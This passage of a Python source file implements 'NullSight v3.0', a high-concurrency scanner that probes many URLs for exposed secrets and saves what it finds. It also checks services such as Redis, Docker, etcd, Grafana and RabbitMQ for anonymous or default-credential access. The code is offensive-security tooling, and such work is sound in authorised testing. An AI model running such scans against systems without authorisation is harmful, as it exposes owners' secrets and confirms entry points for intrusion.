                            f"# Label: {label}\n"
                            f"# Status: {status_code}\n"
                            f"# CT: {content_type}\n"
                            f"# Size: {len(body)} bytes\n"
                            f"# Timestamp: {ts}\n"
                            f"{'─'*60}\n\n")
                try:
                    if ext == ".json":
                        f.write(json.dumps(json.loads(text), indent=2, ensure_ascii=False))
                    else:
                        f.write(text)
                except Exception:
                    f.write(text)
        else:
            with open(filepath, "wb") as f:
                f.write(body)

        console.print(f"  [bold green]✓ saved → {filename}[/bold green]")
        return filename
    except Exception as e:
        console.print(f"  [red]✗ save error: {e}[/red]")
        return ""

# ─────────────────────────────────────────────────────────────────────────────
# HTTP FETCH — optimized for max RPS
# ─────────────────────────────────────────────────────────────────────────────
async def fetch(
    session: aiohttp.ClientSession,
    url: str, probe: Probe,
    stats: Stats, retries: int = 0,
) -> Optional[Tuple[int, str, int, bytes]]:
    headers = {
        "User-Agent":      random.choice(CONFIG.user_agents),
        "Accept":          "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection":      "keep-alive",
        "Accept-Language": "en-US,en;q=0.9",
    }
    if probe.extra_headers:
        headers.update(probe.extra_headers)

    timeout = aiohttp.ClientTimeout(
        total=CONFIG.timeout,
        connect=CONFIG.connect_timeout,
        sock_read=CONFIG.read_timeout,
    )
    kwargs: dict = dict(
        headers=headers,
        timeout=timeout,
        allow_redirects=True,
        max_redirects=3,
        ssl=False,
    )
    if probe.method == "POST":
        if probe.body is not None:
            ct_header = (probe.extra_headers or {}).get("Content-Type", "application/json")
            if "json" in ct_header:
                kwargs["json"] = probe.body
            elif "xml" in ct_header:
                kwargs["data"] = probe.body
            else:
                kwargs["json"] = probe.body
        else:
            kwargs["data"] = b""

    try:
        async with session.request(probe.method, url, **kwargs) as resp:
            status = resp.status

            # Backoff on throttle
            if status in (429, 503):
                stats.throttled += 1
                await asyncio.sleep(min(2 ** retries + random.uniform(0, 0.5), 15.0))
                if retries < CONFIG.max_retries:
                    return await fetch(session, url, probe, stats, retries + 1)
                return None

            # Only interesting statuses
            if status not in (200, 201, 301, 302, 307, 308, 401, 403):
                return None

            ct     = resp.headers.get("Content-Type", "")
            cl_hdr = resp.headers.get("Content-Length", "-1")
            cl     = int(cl_hdr) if cl_hdr.lstrip("-").isdigit() else -1

            # Zero-copy streaming with hard limit
            chunks = []
            total_read = 0
            async for chunk in resp.content.iter_chunked(8192):
                chunks.append(chunk)
                total_read += len(chunk)
                if total_read >= CONFIG.max_body_bytes:
                    break

            body = b"".join(chunks)
            if cl == -1:
                cl = len(body)

            return status, ct, cl, body

    except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
        pass
    except Exception:
        pass

    stats.errors += 1
    return None

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 2: REAL AUTH SERVICE SCANNER
# ─────────────────────────────────────────────────────────────────────────────
async def check_service(
    host: str,
    check: ServiceCheck,
    timeout: int,
) -> Optional[ServiceFinding]:
    """Real service verification with authentication testing."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, check.port, ssl=False),
            timeout=timeout,
        )
    except Exception:
        return None

    banner = b""
    verified = False
    auth_detail = ""

    try:
        # Send initial probe
        if check.probe_bytes:
            writer.write(check.probe_bytes)
            await writer.drain()

        # Read banner
        try:
            banner = await asyncio.wait_for(reader.read(4096), timeout=timeout)
        except asyncio.TimeoutError:
            pass

        if not banner:
            writer.close()
            try:
                await asyncio.wait_for(writer.wait_closed(), timeout=1)
            except Exception:
                pass
            return None

        # Check confirm_pattern
        if check.confirm_pattern and check.confirm_pattern not in banner:
            # Try banner_pattern fallback
            if check.banner_pattern and not check.banner_pattern.search(banner):
                writer.close()
                try:
                    await asyncio.wait_for(writer.wait_closed(), timeout=1)
                except Exception:
                    pass
                return None

        if not check.confirm_pattern and check.banner_pattern:
            if not check.banner_pattern.search(banner):
                writer.close()
                try:
                    await asyncio.wait_for(writer.wait_closed(), timeout=1)
                except Exception:
                    pass
                return None

        # ── Real auth verification ──────────────────────────
        if check.auth_probe:
            try:
                writer.write(check.auth_probe)
                await writer.drain()
                auth_response = await asyncio.wait_for(reader.read(4096), timeout=timeout)

                if check.auth_success and check.auth_success in auth_response:
                    verified = True
                    # Service-specific auth detail messages
                    if check.service == "FTP":
                        auth_detail = "anonymous login SUCCESS (230 Login successful)"
                    elif check.service == "Redis":
                        auth_detail = "no authentication required — INFO accessible"
                    elif check.service == "MongoDB":
                        auth_detail = "listDatabases accessible — no auth required"
                    elif check.service == "RabbitMQ Management":
                        auth_detail = "default guest:guest credentials ACCEPTED"
                    elif check.service == "Grafana":
                        auth_detail = "default admin:admin credentials ACCEPTED"
                    elif check.service == "Docker Daemon":
                        auth_detail = "container list accessible — full RCE possible"
                    elif check.service == "Jupyter Notebook":
                        auth_detail = "API accessible without token — direct code execution"
                    elif check.service == "SMTP":
                        auth_detail = "OPEN RELAY — accepts mail for external domains"
                    elif check.service == "Kubernetes API (insecure)":
                        auth_detail = "namespace list accessible — unauthenticated cluster control"
                    elif check.service == "CouchDB":
                        auth_detail = "all databases accessible without authentication"
                    elif check.service == "Consul":
                        auth_detail = "datacenter config accessible without ACL token"
                    elif check.service == "etcd":
                        auth_detail = "cluster secrets accessible — Kubernetes etcd exposed"
                    elif check.service == "PostgreSQL":
                        auth_detail = "trust authentication — no password required"
                    elif check.service == "LDAP":
                        auth_detail = "anonymous bind SUCCESS — directory accessible"
                    elif check.service == "VNC":
                        auth_detail = "no-auth security type offered — direct desktop access"
                    elif check.service == "Memcached":
                        auth_detail = "stats items accessible — no SASL auth"
                    else:
                        auth_detail = "authentication bypass confirmed"

                elif check.auth_fail and check.auth_fail in auth_response:
                    verified = False
                    auth_detail = "service present but authentication required"
                else:
                    verified = True
                    auth_detail = "service accessible (response received)"

            except Exception:
                pass
        else:
            # No auth probe → just banner confirms service
            verified = True
            auth_detail = "service banner confirmed"
            if check.service == "MySQL":
                auth_detail = "MySQL greeting received — verify anonymous/root access manually"
            elif check.service == "PostgreSQL":
                auth_detail = "PostgreSQL listening — verify trust auth or weak credentials"
            elif check.service == "SSH":
                auth_detail = f"SSH version banner: {banner[:60].decode('utf-8', errors='replace').strip()}"
            elif check.service == "SMB":
                auth_detail = "SMB service confirmed — test null session and EternalBlue"

    except Exception:
        pass
    finally:
        try:
            writer.close()
            await asyncio.wait_for(writer.wait_closed(), timeout=1)
        except Exception:
            pass

    banner_str = banner.decode("utf-8", errors="replace")[:300].strip()

    # For auth-verification services, only report if verified
    if check.auth_probe and not verified:
        # Still report with lower confidence if banner confirmed
        if check.confirm_pattern and check.confirm_pattern in banner:
            return ServiceFinding(
                host=host, port=check.port,
                service=check.service,
                severity="MEDIUM" if check.severity in ("CRITICAL", "HIGH") else check.severity,
                description=f"[SERVICE PRESENT - Auth required] {check.description}",
                banner=banner_str,
                verified=False,
                auth_detail=auth_detail or "authentication required — service is present",
                tags=check.tags,
            )
        return None

    return ServiceFinding(
        host=host, port=check.port,
        service=check.service,
        severity=check.severity,
        description=check.description,
        banner=banner_str,
        verified=verified,
        auth_detail=auth_detail,
        tags=check.tags,
    )

async def run_system_scan(
    hosts: list[str],
    stats: Stats,
    console: Console,
    output_dir: Path,
) -> list[ServiceFinding]:
    console.print(
        f"\n[bold cyan]Module 2: System Service Scan[/bold cyan]"
        f" — {len(hosts)} hosts × {len(SERVICE_CHECKS)} checks"
        f" ([dim]real auth verification enabled[/dim])\n"
    )

    findings: list[ServiceFinding] = []
    total = len(hosts) * len(SERVICE_CHECKS)
    stats.sys_checks = total

    semaphore = asyncio.Semaphore(CONFIG.sys_scan_concurrency)

    async def bounded_check(host: str, check: ServiceCheck):
        async with semaphore:
            return await check_service(host, check, CONFIG.sys_scan_timeout)

    tasks = [bounded_check(h, c) for h in hosts for c in SERVICE_CHECKS]

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        MofNCompleteColumn(),
        TextColumn("[red]findings: {task.fields[findings]}"),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task_id = progress.add_task("Service scanning…", total=total, findings=0)
        chunk_size = 1000
        for i in range(0, len(tasks), chunk_size):
            results = await asyncio.gather(*tasks[i:i + chunk_size])
            for result in results:
                progress.update(task_id, advance=1, findings=stats.sys_findings)
                if result is not None:
                    findings.append(result)
                    stats.sys_findings += 1
                    color  = "bold red" if result.severity == "CRITICAL" else \
                             "red"      if result.severity == "HIGH" else "yellow"
                    verified_icon = "[bold green]✓VERIFIED[/bold green]" if result.verified else "[dim]detected[/dim]"
                    console.print(
                        f"  [{color}][{result.severity}][/{color}] "
                        f"{verified_icon} "
                        f"[green]{result.host}:{result.port}[/green] "
                        f"[bold]{result.service}[/bold]"
                        f"[dim] — {result.auth_detail[:70]}[/dim]"
                    )

    return findings

# ─────────────────────────────────────────────────────────────────────────────
# HTTP WORKER — zero-overhead inner loop
# ─────────────────────────────────────────────────────────────────────────────
async def worker(
    queue: asyncio.Queue,
    session: aiohttp.ClientSession,
    stats: Stats,
    findings: list,
    progress, task_id,
    console: Console,
    output_dir: Path,
) -> None:
    while True:
        item = await queue.get()
        if item is None:
            queue.task_done()
            break

        root_url, probe = item
        full_url = root_url.rstrip("/") + "/" + probe.path.lstrip("/")

        if CONFIG.delay_max > 0:
            await asyncio.sleep(random.uniform(CONFIG.delay_min, CONFIG.delay_max))

        result = await fetch(session, full_url, probe, stats)
        stats.done += 1

        if result is not None:
            status, ct, cl, body = result
            text     = body.decode("utf-8", errors="replace")
            fired    = set()
            matched  = False
            saved_fn = ""

            for sig in SIGNATURES:
                if sig.name in fired:
                    continue

                haystack = body if sig.is_bytes else text
                try:
                    match = sig.pattern.search(haystack)
                except TypeError:
                    continue

                if match and not is_false_positive(ct, cl, body, sig, probe.path, status):
                    entropy_flag = has_high_entropy_secret(text)
                    f = Finding(
                        url=full_url, path=probe.path, label=probe.label,
                        method=probe.method, status_code=status,
                        content_length=cl,
                        signature_name=sig.name,
                        severity=sig.severity,
                        description=sig.description,
                        cve=probe.cve or sig.cve,
                        tags=sig.tags,
                        snippet=text[:500].strip(),
                        entropy_flag=entropy_flag,
                    )
                    findings.append(f)
                    stats.findings += 1
                    matched = True
                    fired.add(sig.name)

                    color = {
                        "CRITICAL": "bold red",
                        "HIGH":     "red",
                        "MEDIUM":   "yellow",
                        "LOW":      "cyan",
                    }.get(sig.severity, "white")

                    cve_str = (f"[bold cyan][{probe.cve or sig.cve}][/bold cyan] "
                               if (probe.cve or sig.cve) else "")
                    console.print(
                        f"  [{color}][{sig.severity}][/{color}] "
                        f"{cve_str}"
                        f"[green]{full_url}[/green]  "
                        f"[dim]→ {sig.name}[/dim]"
                    )

            if matched and not saved_fn:
                saved_fn = await save_found_file(
                    root_url, probe.path, probe.label,
                    status, ct, body, output_dir, console)
                for f in findings[-10:]:
                    if f.url == full_url and not f.saved_file:
                        f.saved_file = saved_fn

        progress.update(task_id, advance=1, rps=stats.rps, findings=stats.findings)
        queue.task_done()

# ─────────────────────────────────────────────────────────────────────────────
# PRODUCER
# ─────────────────────────────────────────────────────────────────────────────
async def producer(queue: asyncio.Queue, urls: list) -> None:
    for url in urls:
        for probe in PROBES:
            await queue.put((url, probe))
    for _ in range(CONFIG.concurrency):
        await queue.put(None)

# ─────────────────────────────────────────────────────────────────────────────
# REPORTING
# ─────────────────────────────────────────────────────────────────────────────
def save_json(findings: list, svc_findings: list, path: Path) -> None:
    data = {
        "generated_by":    "NullSight v3.0",
        "generated_at":    datetime.utcnow().isoformat(),
        "http_findings":   [asdict(f) for f in findings],
        "service_findings":[asdict(f) for f in svc_findings],
    }
    with open(path, "w") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def save_csv(findings: list, path: Path) -> None:
    if not findings: return
    fields = list(asdict(findings[0]).keys())
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=fields)
        w.writeheader()
        for finding in findings:
            row = asdict(finding)
            row["tags"] = ", ".join(row["tags"])
            w.writerow(row)

def save_markdown(
    findings: list, svc_findings: list,
    stats: Stats, path: Path,
) -> None:
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    all_http  = sorted(findings,     key=lambda x: sev_order.get(x.severity, 9))
    all_svc   = sorted(svc_findings, key=lambda x: sev_order.get(x.severity, 9))

    with open(path, "w", encoding="utf-8") as f:
        f.write("# NullSight v3.0 — Penetration Test Report\n\n")
        f.write(f"**Generated**: {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}  \n")
        f.write(f"**Tool**: NullSight v3.0 by TheDEEP (www.thedeep.uz)  \n")
        f.write(f"**Duration**: {stats.elapsed:.1f}s  \n")
        f.write(f"**HTTP Requests**: {stats.done:,}  \n")
        f.write(f"**HTTP Findings**: {stats.findings}  \n")
        f.write(f"**Service Findings**: {stats.sys_findings}  \n\n")
        f.write("---\n\n")
        f.write("> ⚠ **AUTHORIZED USE ONLY** — This report is confidential.\n\n")
        f.write("---\n\n")

        # Executive summary
        sev_count: dict = {}
        for fi in findings:
            sev_count[fi.severity] = sev_count.get(fi.severity, 0) + 1
        svc_sev: dict = {}
        for sf in svc_findings:
            svc_sev[sf.severity] = svc_sev.get(sf.severity, 0) + 1

        f.write("## Executive Summary\n\n")
        f.write("| Severity | HTTP | Service | Total |\n|---|---|---|---|\n")
        for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
            h = sev_count.get(sev, 0)
            s = svc_sev.get(sev, 0)
            if h + s > 0:
                f.write(f"| **{sev}** | {h} | {s} | **{h+s}** |\n")
        f.write("\n---\n\n")

        if all_http:
            f.write("## Module 1: HTTP Probe Findings\n\n")
            for i, finding in enumerate(all_http, 1):
                sev_icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}.get(finding.severity, "⚪")
                f.write(f"### [{i}] {sev_icon} {finding.severity} — {finding.signature_name}\n\n")
                f.write("| Field | Value |\n|---|---|\n")
                f.write(f"| URL | `{finding.url}` |\n")
                f.write(f"| Method | {finding.method} |\n")
                f.write(f"| Status | {finding.status_code} |\n")
                f.write(f"| CVE | {finding.cve or '—'} |\n")
                f.write(f"| Tags | {', '.join(finding.tags)} |\n")
                f.write(f"| Description | {finding.description} |\n")
                f.write(f"| High Entropy | {'⚠ YES' if finding.entropy_flag else 'no'} |\n\n")
                if finding.snippet:
                    snippet = finding.snippet[:400].replace('`', "'")
                    f.write(f"**Evidence snippet**:\n```\n{snippet}\n```\n\n")
                f.write("---\n\n")

        if all_svc:
            f.write("## Module 2: Service Findings\n\n")
            for i, sf in enumerate(all_svc, 1):
                sev_icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}.get(sf.severity, "⚪")
                verified_str = "✅ **AUTH BYPASS VERIFIED**" if sf.verified else "⚠ Service detected"
                f.write(f"### [{i}] {sev_icon} {sf.severity} — {sf.service} @ {sf.host}:{sf.port}\n\n")
                f.write("| Field | Value |\n|---|---|\n")
                f.write(f"| Host | `{sf.host}` |\n")
                f.write(f"| Port | {sf.port} |\n")
                f.write(f"| Service | {sf.service} |\n")
                f.write(f"| Verified | {verified_str} |\n")
                f.write(f"| Auth Detail | {sf.auth_detail} |\n")
                f.write(f"| Tags | {', '.join(sf.tags)} |\n")
                f.write(f"| Description | {sf.description} |\n\n")
                if sf.banner:
                    banner_esc = sf.banner[:300].replace('`', "'")
                    f.write(f"**Banner**:\n```\n{banner_esc}\n```\n\n")
                f.write("---\n\n")

def print_summary(
    stats: Stats,
    findings: list,
    svc_findings: list,
    console: Console,
) -> None:
    sev_count: dict = {}
    cve_set:   set  = set()
    for f in findings:
        sev_count[f.severity] = sev_count.get(f.severity, 0) + 1
        if f.cve: cve_set.add(f.cve)
    svc_sev: dict = {}
    svc_verified = sum(1 for sf in svc_findings if sf.verified)
    for sf in svc_findings:
        svc_sev[sf.severity] = svc_sev.get(sf.severity, 0) + 1

    t = Table(
        title="NullSight v3.0 — Scan Summary",
        style="bold", box=box.DOUBLE_EDGE)
    t.add_column("Metric",  style="cyan",  no_wrap=True)
    t.add_column("Value",   style="white")

    t.add_row("Elapsed",                f"{stats.elapsed:.1f}s")
    t.add_row("Avg RPS",                f"{stats.rps:.1f} req/s")
    t.add_row("HTTP requests sent",     f"{stats.done:,}")
    t.add_row("HTTP findings",          f"[bold]{stats.findings}[/bold]")
    t.add_row("Service checks",         f"{stats.sys_checks:,}")
    t.add_row("Service findings",       f"[bold]{stats.sys_findings}[/bold]")
    t.add_row("Auth bypass verified",   f"[bold green]{svc_verified}[/bold green]")
    t.add_row("Errors / Throttled",     f"{stats.errors} / {stats.throttled}")
    t.add_row("─" * 24,                 "─" * 18)

    for sev, color in [("CRITICAL","bold red"),("HIGH","red"),("MEDIUM","yellow"),("LOW","cyan")]:
        h = sev_count.get(sev, 0)
        s = svc_sev.get(sev, 0)
        total_sev = h + s
        if total_sev:
            t.add_row(
                f"  {sev}",
                f"[{color}]{total_sev}[/{color}] "
                f"[dim](HTTP:{h} / Svc:{s})[/dim]"
            )

    if cve_set:
        t.add_row("CVEs detected",   str(len(cve_set)))
        sorted_cves = sorted(cve_set)
        t.add_row("CVE list",        "\n".join(sorted_cves[:15]))

    console.print()
    console.print(t)

# ─────────────────────────────────────────────────────────────────────────────
# URL / HOST LOADER
# ─────────────────────────────────────────────────────────────────────────────
def load_urls(path: str) -> list[str]:
    p = Path(path)
    if not p.exists():
        raise FileNotFoundError(f"URL file not found: {path}")
    urls = []
    for line in p.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if not line.startswith(("http://", "https://")):
            line = "https://" + line
        urls.append(line)
    return list(dict.fromkeys(urls))  # deduplicate, preserve order

def extract_hosts(urls: list[str]) -> list[str]:
    hosts = set()
    for url in urls:
        parsed = urlparse(url)
        host = parsed.hostname
        if host:
            hosts.add(host)
    return sorted(hosts)

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
async def run(console: Console) -> None:
    urls  = load_urls(CONFIG.url_file)
    hosts = extract_hosts(urls)
    total = len(urls) * len(PROBES)

    console.print(Panel(
        f"[bold cyan]NullSight v3.0 — World-Class Authorized Pentest Scanner[/bold cyan]\n"
        f"[bold]Author:[/bold] TheDEEP | www.thedeep.uz | 2026\n\n"
        f"[bold]Module 1: HTTP Probe Scanner[/bold]\n"
        f"  Targets        : [yellow]{len(urls):,}[/yellow]\n"
        f"  Probes/target  : [yellow]{len(PROBES)}[/yellow]\n"
        f"  Total probes   : [yellow]{total:,}[/yellow]\n"
        f"  Signatures     : [yellow]{len(SIGNATURES)}[/yellow] "
        f"[dim](CRITICAL/HIGH/MEDIUM — 8-layer FP filter)[/dim]\n"
        f"  Workers        : [yellow]{CONFIG.concurrency}[/yellow]\n"
        f"  Body limit     : [yellow]{CONFIG.max_body_bytes//1024}KB[/yellow]\n\n"
        f"[bold]Module 2: Service Scanner[/bold]"
        f"  {'[green]ENABLED[/green]' if CONFIG.sys_scan_enabled else '[dim]DISABLED[/dim]'}\n"
        f"  Hosts          : [yellow]{len(hosts)}[/yellow]\n"
        f"  Service checks : [yellow]{len(SERVICE_CHECKS)}[/yellow]\n"
        f"  [dim]Real auth verification: FTP anon login, Redis PING/INFO, MongoDB listDatabases,[/dim]\n"
        f"  [dim]MySQL banner, PostgreSQL trust, RabbitMQ guest:guest, Grafana admin:admin,[/dim]\n"
        f"  [dim]Docker API, K8s namespaces, Jupyter API, CouchDB, Consul, etcd, LDAP, VNC[/dim]",
        title="[bold green]⚠  AUTHORIZED PENTEST ONLY  ⚠[/bold green]",
        border_style="green",
    ))

    out_dir = Path(CONFIG.output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    stats    = Stats(total=total)
    findings: list[Finding] = []
    svc_findings: list[ServiceFinding] = []

    # ── Module 1: HTTP ──────────────────────────────────────────
    console.print(f"\n[bold]Module 1: HTTP Probe Scan[/bold] — {total:,} requests\n")
    queue: asyncio.Queue = asyncio.Queue(maxsize=CONFIG.queue_maxsize)

    connector = aiohttp.TCPConnector(
        ssl=False,
        limit=CONFIG.concurrency + 200,
        limit_per_host=CONFIG.per_host_limit,
        ttl_dns_cache=CONFIG.dns_cache_ttl,
        use_dns_cache=True,
        force_close=False,          # Keep-alive for speed
        enable_cleanup_closed=True,
        keepalive_timeout=30,
        resolver=aiohttp.AsyncResolver(),  # Async DNS resolution
    )

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        MofNCompleteColumn(),
        TextColumn("[yellow]{task.fields[rps]:.0f} req/s"),
        TextColumn("[red]findings: {task.fields[findings]}"),
        TimeElapsedColumn(),
        console=console,
        refresh_per_second=10,
    ) as progress:
        task_id = progress.add_task("HTTP scanning…", total=total, rps=0.0, findings=0)

        async with aiohttp.ClientSession(
            connector=connector,
            connector_owner=True,
            trust_env=False,
        ) as session:
            workers = [
                asyncio.create_task(
                    worker(queue, session, stats, findings,
                           progress, task_id, console, out_dir)
                )
                for _ in range(CONFIG.concurrency)
            ]
            await producer(queue, urls)
            await asyncio.gather(*workers)

    # ── Module 2: Service scan ──────────────────────────────────
    if CONFIG.sys_scan_enabled and hosts:
        svc_findings = await run_system_scan(hosts, stats, console, out_dir)

    # ── Reports ─────────────────────────────────────────────────
    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    jp = out_dir / f"report_{ts}.json"
    cp = out_dir / f"report_{ts}.csv"
    mp = out_dir / f"report_{ts}.md"

    save_json(findings, svc_findings, jp)
    save_csv(findings, cp)
    save_markdown(findings, svc_findings, stats, mp)
    print_summary(stats, findings, svc_findings, console)

    console.print(f"\n[bold green]Reports saved:[/bold green]")
    console.print(f"  JSON     → [cyan]{jp}[/cyan]")
    console.print(f"  CSV      → [cyan]{cp}[/cyan]")
    console.print(f"  Markdown → [cyan]{mp}[/cyan]")
    console.print(f"  Files    → [cyan]{out_dir}/[/cyan]\n")

# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────
def main() -> None:
    import argparse
    console = Console()

    console.print(Panel(DISCLAIMER, border_style="yellow"))
    answer = input(">>> ").strip().upper()
    if answer != "YES":
        console.print("[red]Declined. Exiting.[/red]")
        sys.exit(0)

    p = argparse.ArgumentParser(
        description="NullSight v3.0 — World-Class Authorized Pentest Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example: python nullsight_v3.py -u targets.txt -c 200 --output-dir results/"
    )
    p.add_argument("-c",  "--concurrency",      type=int,   default=150,
                   help="HTTP worker concurrency (default: 150)")
    p.add_argument("-t",  "--timeout",          type=int,   default=15,
                   help="Total request timeout in seconds (default: 15)")
    p.add_argument("--connect-timeout",         type=int,   default=6)
    p.add_argument("--read-timeout",            type=int,   default=12)
    p.add_argument("-q",  "--queue-size",       type=int,   default=10000)
    p.add_argument("-u",  "--url-file",         default="url.txt",
                   help="File containing target URLs (one per line)")
    p.add_argument("-o",  "--output-dir",       default="NullSight_findings")
    p.add_argument("-b",  "--body-limit",       type=int,   default=131072,
                   help="Max body bytes to read per response (default: 128KB)")
    p.add_argument("--delay",                   type=float, default=0.0,
                   help="Max delay between requests per worker (0=max speed)")
    p.add_argument("--per-host-limit",          type=int,   default=20,
                   help="Max concurrent connections per host")
    p.add_argument("--no-sysscan",              action="store_true",
                   help="Disable Module 2 service scan")
    p.add_argument("--sysscan-timeout",         type=int,   default=6)
    p.add_argument("--sysscan-concurrency",     type=int,   default=300)
    args = p.parse_args()

    CONFIG.concurrency           = args.concurrency
    CONFIG.timeout               = args.timeout
    CONFIG.connect_timeout       = args.connect_timeout
    CONFIG.read_timeout          = args.read_timeout
    CONFIG.queue_maxsize         = args.queue_size
    CONFIG.url_file              = args.url_file
    CONFIG.output_dir            = args.output_dir
    CONFIG.max_body_bytes        = args.body_limit
    CONFIG.delay_max             = args.delay
    CONFIG.per_host_limit        = args.per_host_limit
    CONFIG.sys_scan_enabled      = not args.no_sysscan
    CONFIG.sys_scan_timeout      = args.sysscan_timeout
    CONFIG.sys_scan_concurrency  = args.sysscan_concurrency

    try:
        asyncio.run(run(console))
    except FileNotFoundError as e:
        console.print(f"[bold red]Error:[/bold red] {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted.[/yellow]")
        sys.exit(0)

if __name__ == "__main__":
    main()
